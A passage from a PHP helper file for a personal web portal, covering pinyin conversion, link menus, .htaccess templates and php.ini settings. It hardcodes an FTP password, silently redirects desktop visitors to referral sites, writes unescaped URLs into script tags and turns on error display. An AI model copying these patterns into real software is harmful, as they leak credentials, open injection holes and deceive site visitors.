                        "|peng|pi|pian|piao|pie|pin|ping|po|pu|qi|qia|qian|qiang|qiao|qie|qin|qing|qiong|qiu|qu|quan|que|qun|ran|rang".  
                        "|rao|re|ren|reng|ri|rong|rou|ru|ruan|rui|run|ruo|sa|sai|san|sang|sao|se|sen|seng|sha|shai|shan|shang|shao|".  
                        "she|shen|sheng|shi|shou|shu|shua|shuai|shuan|shuang|shui|shun|shuo|si|song|sou|su|suan|sui|sun|suo|ta|tai|".  
                        "tan|tang|tao|te|teng|ti|tian|tiao|tie|ting|tong|tou|tu|tuan|tui|tun|tuo|wa|wai|wan|wang|wei|wen|weng|wo|wu".  
                        "|xi|xia|xian|xiang|xiao|xie|xin|xing|xiong|xiu|xu|xuan|xue|xun|ya|yan|yang|yao|ye|yi|yin|ying|yo|yong|you".  
                        "|yu|yuan|yue|yun|za|zai|zan|zang|zao|ze|zei|zen|zeng|zha|zhai|zhan|zhang|zhao|zhe|zhen|zheng|zhi|zhong|".  
                        "zhou|zhu|zhua|zhuai|zhuan|zhuang|zhui|zhun|zhuo|zi|zong|zou|zu|zuan|zui|zun|zuo";  
        }
        elseif ($_lang == "en"){
                $_DataKey = "ah|ai|an|ung|ao|bah|bai|bahn|bung|bao|bei|ben|beoung|bie|bieyan|byyao|bieyea|bien|bing|boh|bwu|cah|cai|cahn|cahng|cao|ce|ceng|chah".  
                        "|chai|chahn|chahng|chao|cheh|cheng|chenng|chir|chon|chou|chuu|chuai|chuahn|chuang|chuie|chuun|chuuo|cir|chon|chou|chu|".  
                        "chuahn|cuie|chuun|cuuo|dah|dai|dahn|dung|dao|de|deung|dea|diyan|diyao|diye|diung|diyu|dohng|deyo|du|durun|duiae|duun|duo|eh|ern|eehr".  
                        "|fa|fahn|faun|fei|fen|fueng|fo|fouo|fu|gah|gai|gan|guang|ggaoo|ggaah|gei|gen|geng|gohng|go|guuu|gwah|gwya|gwan|gwang|gwi".  
                        "|guun|gguo|ha|hyai|han|hung|hao|heh|hei|hen|heng|hong|ho|hu|hhwa|huwai|huuan|hwang|huie|huun|huuo|gee|jia|gian|giyang".  
                        "|jiao|jieyea|jin|jing|jiyohng|jiu|jjyuuy|juyahngn|juyeh|jun|kah|kahi|kahn|kahng|kao|ke|ken|keng|cong|ko|koo|kwa|kwia|kwan|kwang".  
                        "|kwuie|kwun|kwuuo|la|laiy|lan|luang|lao|lllae|lei|leng|leee|liya|liiahn|niang|liyao|leeyae|lin|ling|leeyu|lohng|llowu|luuuu|lv|luuwan|yuie".  
                        "|luun|luwo|ma|mai|marn|mung|maho|meh|meiy|men|meng|mie|miyan|miyao|miye|mien|ming|miyiu|morh|myoh|mwu|nah|nahi|nan|naung|naho|nae".  
                        "|niei|nehn|neng|nee|nian|niang|niao|nee|nin|ning|niyu|norng|nuu|niyv|nuan|niuo|nwo|oh|au|paah|pai|pan|paung|huuo|pei|pen".  
                        "|peng|pee|pyan|piauu|peayae|pinng|ping|por|puu|tchee|tchya|tchiyan|tchyang|tchyao|tchyeh|tchin|ching|tchiyohng|tchyo|tchyuu|tchyuahn|tchyuye|tchyun|ran|raung".  
                        "|rzao|rze|rengn|reungn|riee|rorng|raeo|ruho|rwan|ruie|raen|ruhoruo|sa|sai|san|sang|sao|sae|sen|seng|sah|sahi|sahn|sahng|sao|".  
                        "sehae|sehn|sehng|sshzee|so|su|swa|swyi|swuan|swang|suie|swuun|suo|sszee|song|sso|su|swan|suie|swen|suo|ta|tai|".  
                        "tan|taung|tao|tahe|teung|tee|tiahn|tiyao|tiae|ting|tong|tezo|tuuuu|twan|tuiw|tuun|tuwo|wa|wya|wan|waung|wei|wen|weng|wo|wu".  
                        "|shee|sshyah|shiyan|shiang|shiyao|shiee|xin|xing|shiog|shiyou|shyu|shywan|sshyuyy|shwaen|yah|yan|iang|yaro|ye|yee|yin|ying|yo|iuang|you".  
                        "|yuy|yuan|yure|yun|zah|zai|zahn|zaung|zao|ze|zei|zen|zeng|zhah|zhai|zhan|zhang|zhao|zheh|zhen|zheng|zheey|zhong|".  
                        "zo|zhuu|zhuah|zhwya|zhwarn|zhwang|zhuie|zhuun|zhuo|zeey|zong|zo|zuuu|zuan|zuui|zuun|zuuo";  
        }
        $_DataValue = "-20319|-20317|-20304|-20295|-20292|-20283|-20265|-20257|-20242|-20230|-20051|-20036|-20032|-20026|-20002|-19990".  
                "|-19986|-19982|-19976|-19805|-19784|-19775|-19774|-19763|-19756|-19751|-19746|-19741|-19739|-19728|-19725".  
                "|-19715|-19540|-19531|-19525|-19515|-19500|-19484|-19479|-19467|-19289|-19288|-19281|-19275|-19270|-19263".  
                "|-19261|-19249|-19243|-19242|-19238|-19235|-19227|-19224|-19218|-19212|-19038|-19023|-19018|-19006|-19003".  
                "|-18996|-18977|-18961|-18952|-18783|-18774|-18773|-18763|-18756|-18741|-18735|-18731|-18722|-18710|-18697".  
                "|-18696|-18526|-18518|-18501|-18490|-18478|-18463|-18448|-18447|-18446|-18239|-18237|-18231|-18220|-18211".  
                "|-18201|-18184|-18183|-18181|-18012|-17997|-17988|-17970|-17964|-17961|-17950|-17947|-17931|-17928|-17922".  
                "|-17759|-17752|-17733|-17730|-17721|-17703|-17701|-17697|-17692|-17683|-17676|-17496|-17487|-17482|-17468".  
                "|-17454|-17433|-17427|-17417|-17202|-17185|-16983|-16970|-16942|-16915|-16733|-16708|-16706|-16689|-16664".  
                "|-16657|-16647|-16474|-16470|-16465|-16459|-16452|-16448|-16433|-16429|-16427|-16423|-16419|-16412|-16407".  
                "|-16403|-16401|-16393|-16220|-16216|-16212|-16205|-16202|-16187|-16180|-16171|-16169|-16158|-16155|-15959".  
                "|-15958|-15944|-15933|-15920|-15915|-15903|-15889|-15878|-15707|-15701|-15681|-15667|-15661|-15659|-15652".  
                "|-15640|-15631|-15625|-15454|-15448|-15436|-15435|-15419|-15416|-15408|-15394|-15385|-15377|-15375|-15369".  
                "|-15363|-15362|-15183|-15180|-15165|-15158|-15153|-15150|-15149|-15144|-15143|-15141|-15140|-15139|-15128".  
                "|-15121|-15119|-15117|-15110|-15109|-14941|-14937|-14933|-14930|-14929|-14928|-14926|-14922|-14921|-14914".  
                "|-14908|-14902|-14894|-14889|-14882|-14873|-14871|-14857|-14678|-14674|-14670|-14668|-14663|-14654|-14645".  
                "|-14630|-14594|-14429|-14407|-14399|-14384|-14379|-14368|-14355|-14353|-14345|-14170|-14159|-14151|-14149".  
                "|-14145|-14140|-14137|-14135|-14125|-14123|-14122|-14112|-14109|-14099|-14097|-14094|-14092|-14090|-14087".  
                "|-14083|-13917|-13914|-13910|-13907|-13906|-13905|-13896|-13894|-13878|-13870|-13859|-13847|-13831|-13658".  
                "|-13611|-13601|-13406|-13404|-13400|-13398|-13395|-13391|-13387|-13383|-13367|-13359|-13356|-13343|-13340".  
                "|-13329|-13326|-13318|-13147|-13138|-13120|-13107|-13096|-13095|-13091|-13076|-13068|-13063|-13060|-12888".  
                "|-12875|-12871|-12860|-12858|-12852|-12849|-12838|-12831|-12829|-12812|-12802|-12607|-12597|-12594|-12585".  
                "|-12556|-12359|-12346|-12320|-12300|-12120|-12099|-12089|-12074|-12067|-12058|-12039|-11867|-11861|-11847".  
                "|-11831|-11798|-11781|-11604|-11589|-11536|-11358|-11340|-11339|-11324|-11303|-11097|-11077|-11067|-11055".  
                "|-11052|-11045|-11041|-11038|-11024|-11020|-11019|-11018|-11014|-10838|-10832|-10815|-10800|-10790|-10780".  
                "|-10764|-10587|-10544|-10533|-10519|-10331|-10329|-10328|-10322|-10315|-10309|-10307|-10296|-10281|-10274".  
                "|-10270|-10262|-10260|-10256|-10254";  
        $_TDataKey   = explode('|', $_DataKey);  
        $_TDataValue = explode('|', $_DataValue);  

        $_Data = (php_VERSION>='5.0') ? array_combine($_TDataKey,  $_TDataValue) : _Array_Combine($_TDataKey, $_TDataValue);  
        arsort($_Data);  
        reset($_Data);  

        if($_Code != 'gb2312') $_String = _U2_Utf8_Gb($_String);  
        $_Res = '';  
        $_String = hanpc2enpc($_String);
        for($i=0; $i<strlen($_String); $i++)  
        {  
                $_P = ord(substr($_String, $i, 1));  
                if($_P>160) { $_Q = ord(substr($_String, ++$i, 1)); $_P = $_P*256 + $_Q - 65536; }  
                $_Res .= _Pinyin($_P, $_Data)." ";  
        }  
        if ($_symbol === true){
                return preg_replace("/[^a-z0-9 \:\|\.\,\'\"\?\!]*/", '', $_Res);  
                //return preg_replace("/[^a-z0-9 ]*/", '', $_Res); 
        }       
        else
                return preg_replace("/[^a-z0-9]*/", '', $_Res);  
                
        //return $_Res;  
        exit;
}  

function _Pinyin($_Num, $_Data)  
{  
        if    ($_Num>0      && $_Num<160   ) return chr($_Num);  
        elseif($_Num<-20319 || $_Num>-10247) return '';  
        else  {  
                foreach($_Data as $k=>$v){ if($v<=$_Num) break; }  
                return $k;  
        }  
}  

function _U2_Utf8_Gb($_C)  
{  
        $_String = '';  
        if($_C < 0x80) $_String .= $_C;  
        elseif($_C < 0x800)  
        {  
                $_String .= chr(0xC0 | $_C>>6);  
                $_String .= chr(0x80 | $_C & 0x3F);  
        }elseif($_C < 0x10000){  
                $_String .= chr(0xE0 | $_C>>12);  
                $_String .= chr(0x80 | $_C>>6 & 0x3F);  
                $_String .= chr(0x80 | $_C & 0x3F);  
        } elseif($_C < 0x200000) {  
                $_String .= chr(0xF0 | $_C>>18);  
                $_String .= chr(0x80 | $_C>>12 & 0x3F);  
                $_String .= chr(0x80 | $_C>>6 & 0x3F);  
                $_String .= chr(0x80 | $_C & 0x3F);  
        }  
        return iconv('UTF-8', 'GB2312', $_String);  
}  

function _Array_Combine($_Arr1, $_Arr2)  
{  
        for($i=0; $i<count($_Arr1); $i++) $_Res[$_Arr1[$i]] = $_Arr2[$i];  
        return $_Res;  
} 
?>

<?php 
function checkip($ipstr,$url){
        $IPFilter = new IPFilter($ipstr);
        if (arrmember($IPFilter->CheckIP(),0)==='ok'){
        	return array('1',arrmember($IPFilter->CheckIP(),1));
        }
        else{
        	return array('0',arrmember(split("[.]",arrmember($IPFilter->CheckIP(),1)),0).".".arrmember(split("[.]",arrmember($IPFilter->CheckIP(),1)),1),$url."&ip=".arrmember($IPFilter->CheckIP(),1));
                //redirect($url."&ip=".$IPFilter->CheckIP()); 
                break;
        }       
}

function selstyle($skincolor){
        if ($skincolor == ""){
                $skincolor = split("[|]","red|gold|blue|purple|black|green");
                $skincolor = $skincolor[rand(0,5)];
        }
        
        $style = new css();
        switch (strtolower(trim($skincolor))) {
                case "red":
                        $style->selcss("#FFDDDD","#FFEEEE","#FFDDDD");
                        break;
                case "gold":
                        $style->selcss("#FAEFC0","#FDF7DF","#FAEFC0");
                        break;
                case "blue":
                        $style->selcss("#CCE0FF","#DEEBFE","#e5ecf9");
                        break;
                case "purple":
                        $style->selcss("#F5D6F5","#F8E4F8","#F5D6F5");
                        break;
                case "black":
                        $style->selcss("#DDDDDD","#EEEEEE","#DDDDDD");
                        break;
                case "green":
                        $style->selcss("#CBEFCB","#E5F7E5","#CBEFCB");
                        break;
                default:
                        $style->selcss("#DDDDDD","#EEEEEE","#DDDDDD");
                        break;
        }
        return $skincolor;              
}


function deldir($dir,$day,$flag) {
  //先删除目录下的文件：
  $dh=opendir($dir);
  while ($file=readdir($dh)) {
    if($file!="." && $file!=".."){
    	//if(preg_replace($pattern,'$1$2$3',$file)==$file){
    	if((time()-filectime($dir."/".$file))/3600/24 >= $day){    	
      	$fullpath=$dir."/".$file;
      	if(!is_dir($fullpath)) {
          unlink($fullpath);
      	} else {
          deldir($fullpath,$day,'all');
      	}    		
    	}
    }
  }
  closedir($dh);
  
  if($flag=='all'){
  	//删除当前文件夹：
  	if(rmdir($dir)) {
    	return true;
  	} else {
    	return false;
  	}
	}
}

function httppathdir(){

        $Ser = trim($_SERVER["SERVER_NAME"]);
        $Scr = trim($_SERVER["SCRIPT_NAME"]);
        $Port = trim($_SERVER["SERVER_PORT"]);

        $Scr_2 = strrev(substr(strrev($Scr),strpos(strrev($Scr),"/")));

        if(strpos(ini_get('upload_tmp_dir'),'/var/vcap.local/dea/apps/')>=0){
                return "http://".$Ser.$Scr_2;
 				}	
		    elseif(trim($_SERVER["SERVER_PORT"])=="80"){
                return "http://".$Ser.$Scr_2;
        }       
        else{
                return "http://".$Ser.":".trim($_SERVER["SERVER_PORT"]).$Scr_2;
        }

}

Function HttpPath(){

				if(strpos(ini_get('upload_tmp_dir'),'/var/vcap.local/dea/apps/')>=0){
                return "http://".trim($_SERVER["SERVER_NAME"]).ScriptPath();
				}	
		    elseIf (trim($_SERVER["SERVER_PORT"]) == "80")
                return "http://".trim($_SERVER["SERVER_NAME"]).ScriptPath();
        else
                return "http://".trim($_SERVER["SERVER_NAME"]).":".trim($_SERVER["SERVER_PORT"]).ScriptPath();
}

function ScriptPath(){
        return trim($_SERVER["SCRIPT_NAME"]);
}
?>

<?php 
function selskin(){
        $style = new css;
?>
                
                &nbsp<a href="<?php  $style->configrequest($ScriptPath."?".$_SERVER['QUERY_STRING'],"skin","blue")?>" style="color:blue;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","red")?>" style="color:red;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","gold")?>" style="color:gold;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","green")?>" style="color:green;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","purple")?>" style="color:purple;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","black")?>" style="color:black;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>

<?php 
}
?>

<?php 
function redirect($url){
        echo "<script>window.location = \"".$url."\" ;</script>";
        //echo "<script>window.setTimeout(\"location.href=\'".$url."\'\",0);</script>";
        exit;
        //echo "<SCRIPT LANGUAGE=\"JavaScript\">";
        //echo "location.href='$url'";      
        //echo "</SCRIPT>";
        //echo "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$url\">";  
}
?>

<?php 
function union_redirect($surl){
	$url = array();
	$url[0] = "http://www.s3s9.com/reg.asp?r=x3193";
	$url[1] = "http://www.lezhuan.com/?userID=306788";
	$url[2] = "http://www.yulgy.com/reg.html?r=x3193";
	$url[3] = "http://www.lezhuan.com/?userID=306788";
	$url[4] = "http://www.lezhuan.com/?userID=306788";
	$url[5] = "http://www.lezhuan.com/?userID=306788";
	$url[6] = "http://www.lezhuan.com/?userID=306788";
	IF(!is_wap())
		redirect($url[rand(0,count($url)-1)]);
	else
		redirect($surl);
}
?>

<?php 
function encodeuri($str){
        $str = urlencode($str);
        $str = str_replace("<", "%3c", $str);
        $str = str_replace(">", "%3E", $str);
        //$str = str_replace("-", "%2D", $str);
        //$str = str_replace("_", "%5F", $str);
        // 以上取消的代码一度将程序卡死，后发现仅有长连接被卡，试用连接编码简化成功
        return $str;
}
function decodeuri($str){
        $str = urldecode($str);
        $str = str_replace("%2E", ".", $str);
        $str = str_replace("%2D", "-", $str);
        $str = str_replace("%5F", "_", $str);
        return $str;
}
?>

<?php 
function geturlinfo($url,$type){
        if ($type == 'ext'){
                $urlstr = parse_url($url);      
                $urlstr = pathinfo($urlstr["path"]);
                return $urlstr["extension"];    
        }
        elseif ($type == 'filename'){
                $urlstr = parse_url($url);      
                $urlstr = pathinfo($urlstr["path"]);
                return $urlstr["basename"];     
        }               
        elseif ($type == 'dirname'){
                $urlstr = parse_url($url);      
                $urlstr = pathinfo($urlstr["path"]);
                return $urlstr["dirname"];      
        }               
}
?>

<?php 
function arrmember($array,$number){
        return $array[$number];
}
?>

<?php 
function arrsignmember($array,$sign){
        return $array[$sign];
}
?>

<?php 
function request($query){
        if ($_GET[$query] != "" && $_POST[$query] == "")
                return $_GET[$query];
        elseif ($_GET[$query] == "" && $_POST[$query] != "")    
                return $_POST[$query];
        elseif ($_GET[$query] == "" && $_POST[$query] == "")    
                return $_POST[$query];

}
?>

<?php 
function GetGB2312String($name)
{
$tostr = "";
for($i=0;$i<strlen($name);$i++)
{
   $curbin = ord(substr($name,$i,1));
   if($curbin < 0x80)
   {
    $tostr .= substr($name,$i,1);
   }elseif($curbin < bindec("11000000")){
    $str = substr($name,$i,1);
    $tostr .= "&#".ord($str).";";
   }elseif($curbin < bindec("11100000")){
    $str = substr($name,$i,2);
    $tostr .= "&#".GetUnicodeChar($str).";";
    $i += 1;
   }elseif($curbin < bindec("11110000")){
    $str = substr($name,$i,3);
    $gstr= iconv("UTF-8","GB2312",$str);
    if(!$gstr)
    {
    $tostr .= "&#".GetUnicodeChar($str).";";
    }else{
    $tostr .= $gstr;
    }

    $i += 2;
   }elseif($curbin < bindec("11111000")){
    $str = substr($name,$i,4);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 3;
   }elseif($curbin < bindec("11111100")){
    $str = substr($name,$i,5);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 4;
   }else{
    $str = substr($name,$i,6);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 5;
   }
}

return $tostr;
}//end function

function GetUnicodeChar($str)
{
$temp = "";
for($i=0;$i<strlen($str);$i++)
{
   $x = decbin(ord(substr($str,$i,1)));
   if($i == 0)
   {
    $s = strlen($str)+1;
    $temp .= substr($x,$s,8-$s);
   }else{
    $temp .= substr($x,2,6);
   }
}
return bindec($temp);
}//end function

?>

<?php 
function sellink($str,$skincolor){
$sellinkstr = split("[|]",$str);
$linkstr = "";
for ($i = 0;$i < count($sellinkstr);$i++){
        switch (trim($sellinkstr[$i])) {
                case "IVR":
                        //$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=ivr&skin=".$skincolor."\">".formatchar('IVR')."</a> ";
                        break;
                case "网盘":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=vdisk&skin=".$skincolor."\">".formatchar('网盘')."</a> ";
                        break;
                case "搜索":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=bing&skin=".$skincolor."\">".formatchar('搜索')."</a> ";
                        break;
                case "图片":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=picture&skin=".$skincolor."\">".formatchar('图片')."</a> ";
                        break;
                case "短片":
                       	$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=tudou&skin=".$skincolor."\">".formatchar('短片')."</a> ";
                        break;
                case "插件":
                        $linkstr = $linkstr . "<a id=\"zonemap\" style=\"color:#000000\" href=\"?api=setup&skin=".$skincolor."\" target=\"_blank\">".formatchar('插件')."</a> ";
                        break;
                case "工具条":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=ieshow&skin=".$skincolor."\">".formatchar('工具条')."</a> ";
                        break;
                case "地球":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=gmap&skin=".$skincolor."\">".formatchar('地球')."</a> ";
                        break;
                case "读书":
                        //$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=docin&skin=".$skincolor."\">".formatchar('读书')."</a> ";
                        break;
                case "播放":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=player&skin=".$skincolor."\">".formatchar('播放')."</a> ";
                        break;
                case "域名":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=dnspod&skin=".$skincolor."\">".formatchar('域名')."</a> ";
                        break;
                case "主页":
                        $linkstr = $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?skin=".$skincolor."\">".formatchar('主页')."</a> ";
                        break;
                case "首页":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=m&skin=".$skincolor."\">".formatchar('首页')."</a> ";
                        break;                        
                case "PING":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=ping&skin=".$skincolor."\">".formatchar('PING')."</a> ";
                        break;                                               
                case "消息":
                        //$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=imified&skin=".$skincolor."\">".formatchar('消息')."</a> ";
                        break;
                case "编写":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=editor&skin=".$skincolor."\">".formatchar('编写')."</a> ";
                        break;
                case "发信":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=smtp&skin=".$skincolor."\">".formatchar('发信')."</a> ";
                        break;
                case "相册":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=picasa&skin=".$skincolor."\">".formatchar('相册')."</a> ";
                        break;
                case "网址":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=urlshortener&skin=".$skincolor."\">".formatchar('网址')."</a> ";
                        break;
                case "游戏":
                        //$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=idoll&skin=".$skincolor."\">".formatchar('游戏')."</a> ";
                        break;
                case "聊天":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=gtalk&skin=".$skincolor."\">".formatchar('聊天')."</a> ";
                        break;
                case "FTP":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=ftp&skin=".$skincolor."\">".formatchar('FTP')."</a> ";
                        break;
                case "邮件":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=imap&skin=".$skincolor."\">".formatchar('邮件')."</a> ";
                        //$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=byban&skin=".$skincolor."\">".formatchar('邮件')."</a> ";
                        break;
                case "邮箱":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&skin=".$skincolor."\">".formatchar('邮箱')."</a> ";
                        break;
                case "计划":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=zoho&action=planner&skin=".$skincolor."\">".formatchar('计划')."</a> ";
                        break;
                case "会议":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=stickam&skin=".$skincolor."\">".formatchar('会议')."</a> ";
                        break;
                case "阅览":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=zoho&action=viewer&skin=".$skincolor."\">".formatchar('阅览')."</a> ";
                        break;
                case "股票":
                        //$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=10jqka&action=stock&skin=".$skincolor."\">".formatchar('股票')."</a> ";
                        break;
                case "VPN":
                        //$linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=vpn&skin=".$skincolor."\">".formatchar('VPN')."</a> ";
                        break;
                case "SSH":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=ssh&skin=".$skincolor."\">".formatchar('SSH')."</a> ";
                        break;
                case "主机":
                        $linkstr = $linkstr . "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=cloudhost&skin=".$skincolor."\">".formatchar('主机')."</a> ";
                        break;
        }
}
echo ($linkstr)."&nbsp;";
}
?>

<?php 
function formatchar($str,$code=null){
	$codebase = strtolower(($code!=null) ? $code : getcharset());
	if ($codebase != 'gb2312' && $codebase != 'gbk')
		return iconv('gb2312',$codebase,$str);
	ELSE	
		return $str;
}

?>

<?php 
function is_wap(){
    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
    //$uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|sie|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile)/i";
    $uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile|ucweb)/i";
    //if(($ua == '' || preg_match($uachar, $ua)) && !strpos(strtolower($_SERVER['REQUEST_URI']),'wap')){//如果在访问的URL中已经找到 wap字样，表明已经在访问WAP页面，无需跳转，下一版本增加 feed访问时也不跳转
    if(($ua == '' || preg_match($uachar, $ua))){//如果在访问的URL中已经找到 wap字样，表明已经在访问WAP页面，无需跳转，下一版本增加 feed访问时也不跳转
        return true;
    }else{
        return false;
    }
}

/**
 * $str 原始字符串
 * $encoding 原始字符串的编码，默认GBK
 * $prefix 编码后的前缀，默认"&#"
 * $postfix 编码后的后缀，默认";"
 */
function unicode_encode($str, $encoding = 'GBK', $prefix = '&#', $postfix = ';') {
    $str = iconv($encoding, 'UCS-2', $str);
    $arrstr = str_split($str, 2);
    $unistr = '';
    for($i = 0, $len = count($arrstr); $i < $len; $i++) {
        $dec = hexdec(bin2hex($arrstr[$i]));
        $unistr .= $prefix . $dec . $postfix;
    } 
    return $unistr;
} 
 
/**
 * $str Unicode编码后的字符串
 * $encoding 原始字符串的编码，默认GBK
 * $prefix 编码字符串的前缀，默认"&#"
 * $postfix 编码字符串的后缀，默认";"
 */
function unicode_decode($unistr, $encoding = 'GBK', $prefix = '&#', $postfix = ';') {
    $arruni = explode($prefix, $unistr);
    $unistr = '';
    for($i = 1, $len = count($arruni); $i < $len; $i++) {
        if (strlen($postfix) > 0) {
            $arruni[$i] = substr($arruni[$i], 0, strlen($arruni[$i]) - strlen($postfix));
        } 
        $temp = intval($arruni[$i]);
        $unistr .= ($temp < 256) ? chr(0) . chr($temp) : chr($temp / 256) . chr($temp % 256);
    } 
    return iconv('UCS-2', $encoding, $unistr);
} 

?>

<?php 
function htaccess(){
switch (trim(request('action'))) { //action switch start
        case 'wap':
?>
# Rename this file to .htaccess if you want to allow large file uploads
# Note that this file is not always taken into account, depending on your server configuration

<IfModule mod_rewrite.c>

RewriteEngine On
RewriteBase /

#只许绑定的域名访问

RewriteCond %{HTTP_HOST} !^m.x3193.cf$ [NC]
RewriteRule (.*) http://m.x3193.cf/$1 [L,R=301]

#对绑定目录下与 同名的目录的处理

RewriteCond %{REQUEST_URI} ^/m/ [NC]
RewriteCond %{QUERY_STRING} !^(.*)?Rewrite
RewriteRule ^(.*)$ /%{REQUEST_URI}/%{REQUEST_URI}/$1?Rewrite [L,QSA]

</IfModule>

php_value max_execution_time 1200
php_value memory_limit 500M
php_value post_max_size 500M
php_value upload_max_filesize 500M
php_flag enable_dl On
php_flag apc.rfc1867 On
php_value error_reporting 0
php_flag session.use_cookies On
php_value session.cookie_lifetime 999999999
php_value session.gc_maxlifetime 999999999
<?php         
        		break;
        default:	
?>
# Rename this file to .htaccess if you want to allow large file uploads
# Note that this file is not always taken into account, depending on your server configuration

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

# 绑定m.x3193.cf 到 m 子目录
RewriteCond %{HTTP_HOST} ^m.x3193.cf$ [NC]
RewriteCond %{REQUEST_URI} !^/m/
RewriteRule ^(.*)$ m/$1?Rewrite [L,QSA]

#可以绑定多个 只需重复上三行代码并更改一下域名、目录名 就好了

# 绑定m.blog.x3193.cf 到 m/wap 子目录
RewriteCond %{HTTP_HOST} ^m.blog.x3193.cf$ [NC]
RewriteCond %{REQUEST_URI} !^/m/wap/
RewriteRule ^(.*)$ m/wap/$1?Rewrite [L,QSA]

</IfModule>

php_value max_execution_time 1200
php_value memory_limit 500M
php_value post_max_size 500M
php_value upload_max_filesize 500M
php_flag enable_dl On
php_flag apc.rfc1867 On
php_value error_reporting 0
php_flag session.use_cookies On
php_value session.cookie_lifetime 999999999
php_value session.gc_maxlifetime 999999999
<?php 
	}
}
?>

<?php 
function syssetini(){
header("cache-control:no-cache,must-revalidate");

ini_set("max_execution_time","77777");  
ini_set("memory_limit","7777M"); 
ini_set("max_input_time","77777");      
ini_set("max_file_uploads","7777");     
ini_set("post_max_size","500M");        
ini_set("upload_max_filesize","500M");  
//ini_set("enable_dl","1");       
ini_set("display_errors","On");       
ini_set("display_startup_errors","On");       
ini_set("track_errors","On");       
ini_set("extension_dir","7");   
//ini_set("upload_tmp_dir","7");  
//ini_set("output_buffering","4096");     
ini_set("sendmail_from","xcy6272003@163.com");  
ini_set("SMTP","smtp.163.com");         
ini_set("smtp_port","25");      
ini_set("disable_functions","");        
//ini_set("extension_dir","/home/x3193/php/ext"); 
ini_set("error_reporting","E_ALL & E_STRICT");
ini_set("session.use_cookies","1");
ini_set("session.cookie_lifetime","999999999");
ini_set("session.gc_maxlifetime","999999999");
//ini_set("apc.rfc1867","1");
//error_reporting(E_ALL);
ini_set('display_startup_errors', 1);
ini_set('display_errors', 1);

	session_start(); // 启动Session 
	if(isset($_COOKIE[session_name()])) { 
   session_id($_COOKIE[session_name()]); 
	} 
	setcookie(session_name(),session_id(),time()+3600*24*30.5);

if (strtolower(trim($_SERVER['SERVER_NAME'])) == "localhost"){
                $ftpserver = trim($_SERVER['SERVER_NAME']);
                $ftpuname = "x3193";
                $ftppwd = "EUIfgwe7";   
                $ftpport = '21';
                $ftpssl = "0";
                $ftppasv = "1"; 
                $ftpfile = './X3193/index.php'; 
                $ftpdir = './X3193/record';     
                $ftptmpdir = './X3193/tmp';     
                $ftpflag = '0'; 
                $redirecturl = ScriptPath().'?api=blank';    
}
else{
       
                //$ftpfile = './public_html/'.trim($_SERVER['SERVER_NAME']).'/index.php';   
